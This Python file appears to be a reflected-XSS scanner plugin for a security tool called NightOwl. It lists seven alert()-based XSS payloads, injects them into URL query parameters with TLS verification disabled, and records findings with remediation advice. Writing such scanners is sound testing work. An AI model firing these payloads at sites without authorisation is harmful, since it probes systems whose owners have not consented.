"""Reflected XSS scanner plugin."""

import logging
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

import httpx

from nightowl.core.plugin_base import ScannerPlugin
from nightowl.models.finding import Finding, Severity
from nightowl.models.target import Target

logger = logging.getLogger("nightowl")

XSS_PAYLOADS = [
    '<script>alert("NightOwl")</script>',
    '"><img src=x onerror=alert(1)>',
    "' onmouseover='alert(1)'",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    '"><svg onload=alert(1)>',
    "'-alert(1)-'",
]


class XSSScannerPlugin(ScannerPlugin):
    name = "xss-scanner"
    description = "Test for reflected Cross-Site Scripting (XSS)"
    version = "1.0.0"
    stage = "scan"

    async def run(self, target: Target, **kwargs) -> list[Finding]:
        findings = []
        url = target.url or f"https://{target.host}"
        parsed = urlparse(url)
        params = parse_qs(parsed.query)

        if not params:
            params = {"q": ["test"], "search": ["test"], "id": ["1"]}

        try:
            async with httpx.AsyncClient(verify=False, follow_redirects=True, timeout=10) as client:
                for param_name in params:
                    for payload in XSS_PAYLOADS:
                        test_params = {k: v[0] if isinstance(v, list) else v for k, v in params.items()}
                        test_params[param_name] = payload
                        test_url = urlunparse(parsed._replace(query=urlencode(test_params)))

                        try:
                            resp = await client.get(test_url)
                            if payload in resp.text:
                                findings.append(Finding(
                                    title=f"Reflected XSS in parameter '{param_name}'",
                                    severity=Severity.HIGH,
                                    cvss_score=6.1,
                                    description=f"XSS payload reflected in response for parameter {param_name}",
                                    evidence=f"URL: {test_url}\nPayload: {payload}\nReflected in response body",
                                    remediation="Implement input validation and output encoding. Use Content-Security-Policy headers.",
                                    category="xss",
                                    references=["https://owasp.org/www-community/attacks/xss/"],
                                ))
                                break  # one finding per param
                        except Exception:
                            continue

        except Exception as e:
            logger.warning(f"XSS scan failed: {e}")

        return findings
